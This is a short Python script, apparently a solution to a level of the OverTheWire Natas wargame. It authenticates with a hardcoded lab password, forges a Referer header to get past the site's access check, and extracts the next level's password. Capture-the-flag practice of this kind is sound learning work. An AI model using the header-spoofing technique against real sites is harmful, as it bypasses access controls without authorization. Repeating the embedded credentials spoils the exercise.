import requests
import re #regular expressions

username = "natas4"
password = "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth"

head = {"Referer":"http://natas5.natas.labs.overthewire.org/"}

url = 'http://%s.natas.labs.overthewire.org' % username

response = requests.get(url, auth=(username, password), headers=head)
content = response.text

#rint (content)
print (re.findall("natas5 is (.*)",content)[0])
